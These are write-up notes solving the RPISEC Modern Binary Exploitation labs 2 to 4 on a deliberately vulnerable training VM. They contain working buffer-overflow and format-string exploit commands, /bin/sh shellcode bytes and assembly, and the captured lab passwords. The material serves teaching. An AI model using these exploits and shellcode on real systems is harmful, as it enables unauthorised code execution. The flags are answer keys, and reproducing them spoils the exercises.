# Modern Binary Exploitation
## Lab 2

### Lab 2C

```bash
./lab2C `printf 'aaaaaaaaaaaaaaa\xef\xbe\xad\xde'`
$ cat ~lab2B/.pass
1m_all_ab0ut_d4t_b33f
```

### Lab 2B
* RA is 0x1b bytes from the buffer we copy to
* shell is at 0x80486bd
* shell takes an arg
* 0804a028 D exec_string
* but it's a pointer
* 0x80487d0

```bash
lab2B@warzone:/levels/lab02$ ./lab2B `python -c 'print "a"*0x1b + "\xbd\x86\x04\x08" + "AAAA" + "\xd0\x87\x04\x08"'`
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaΩAAAA–á
$ cat ~lab2A/.pass
i_c4ll_wh4t_i_w4nt_n00b
```

### Lab 2A
* We can't overwrite the stack directly, but we can overwrite the value of i. We need to overwrite it to let us write a few extra bytes (16 in a 12 byte buffer), and then quit with a blank line
* The loop doesn't check that i is over a certain value, so we can put anything in i to have it run until overflow, writing as many bytes as we need, until we overwrite the RA, then send a blank line to quit out
* We need to use a subshell with a `cat -` so that we reconnect the stdin back to the terminal, otherwise the elevated shell has no stdin and won't run.
* 080486fd T shell

```bash
lab2A@warzone:/levels/lab02$ (printf "1234567890XX\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\xfd\n\x86\n\x04\n\x08\n\n"; cat -) | ./lab2A
Input 10 words:
Failed to read word
You got it
cat ~lab2end/.pass
D1d_y0u_enj0y_y0ur_cats?
```

## Lab 3

### Lab 3C
* We can overflow buth the username and the password
* username is in .data -> Static location for shellcode (0x08049c40)
* password is on stack -> can overwrite RA
* username must begin witn 'rpisec'

```bash
lab3C@warzone:/levels/lab03$ (python -c "import struct; print 'rpisec' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\n' + 'A'*0x50 + struct.pack('<L', 0x08049c40 + len('rpisec')) + '\n'"; cat) | ./lab3C
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

cat ~lab3B/.pass
th3r3_iz_n0_4dm1ns_0n1y_U!
```

### Lab 3B
* We can overflow a buffer on the stack
* The process forks, and the parent makes sure that the child does not call execve, if it does, it quit
* Need a shellcode that doesn't use execve: open, read, write instead.
  * http://shell-storm.org/shellcode/files/shellcode-73.php
* See lab3B.py.

```bash
lab3B@warzone:/levels/lab03$ python /tmp/lab3B.py|./lab3B
just give me some shellcode, k
wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd
child is exiting...
````

### Lab 3A
* Buffer on the stack in `main`
* Can read from any index
* Can write to any address, except for if the index is a multiple of three or the MSB is 0xb7 (That means 0 also)
* Write 4 bytes at a time
* Tried to patch out the checks, but the .text section is not writeable, so we cannot get around this restriction.

* Stack buffer at 0xbffff548 (in gdb).
* We will need to write shellcode that jumps over every 9-12th byte.

```asm
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  eb 2b                   jmp    30 <bin>
00000005 <back_bin>:
5:  5b                      pop    ebx
6:  eb 04                   jmp    c <hop1>
8:  cc                      int3
9:  cc                      int3
a:  cc                      int3
b:  cc                      int3
0000000c <hop1>:
c:  83 c3 07                add    ebx,0x7
f:  31 c9                   xor    ecx,ecx
11: 90                      nop
12: eb 04                   jmp    18 <hop2>
14: cc                      int3
15: cc                      int3
16: cc                      int3
17: cc                      int3
00000018 <hop2>:
18: 31 d2                   xor    edx,edx
1a: 31 c0                   xor    eax,eax
1c: b0 0b                   mov    al,0xb
1e: eb 04                   jmp    24 <hop3>
20: cc                      int3
21: cc                      int3
22: cc                      int3
23: cc                      int3
00000024 <hop3>:
24: cd 80                   int    0x80
26: 31 c0                   xor    eax,eax
28: 40                      inc    eax
29: cd 80                   int    0x80
2b: 90                      nop
2c: cc                      int3
2d: cc                      int3
2e: cc                      int3
2f: cc                      int3
00000030 <bin>:
30: e8 d0 ff ff ff          call   5 <back_bin>
35: 90                      nop
36: 90                      nop
37: 90                      nop
38: cc                      int3
39: cc                      int3
3a: cc                      int3
3b: cc                      int3
0000003c <bin_str>: "/bin/sh\x00"
```

See _lab3A.py_.

flag:sw00g1ty_sw4p_h0w_ab0ut_d3m_h0ps

## Lab 4
### Lab 4C
* We simply need to leak the flag that is read into a buffer.
* Format string vuln in the usernmae
* Password buffer comes first, then real password, then username.
* Fifth argument gets first 2 bytes of the password, and real password is 100 bytes later, meaning we must start at 5 + 100/4th -1 = 29th argument
* Password is 30 characters long, so we must leak 8 dwords
* See _lab4C.py_

```bash
lab4C@warzone:/levels/lab04$ python /tmp/lab4C.py
bu7_1t_w4sn7_brUt3_f0rc34b1e!
```

### Lab 4B
* Single buffer with format string vuln.
* Start of buffer at 6$.
* Any char in A-Z (0x41-0x5a) will be made lower case.
* `exit(0)` is called, so no overwriting RA.
* `exit@got.plt` is at 0x080499b8.
* Stack is executable, so we can point exit@plt to shell code
* Shell code will be modified if any bytes are capital letters
  * This includes `push eax` and `push ecx`.
  * Easily replaced with `sub esp, 4; mov [esp], <reg>`.
* See _lab4B.py_.

```bash
lab4B@warzone:/levels/lab04$ (python /tmp/lab4B.py; cat -) | ./lab4B
cat ~lab4A/.pass
fg3ts_d0e5n7_m4k3_y0u_1nv1nc1bl3
```
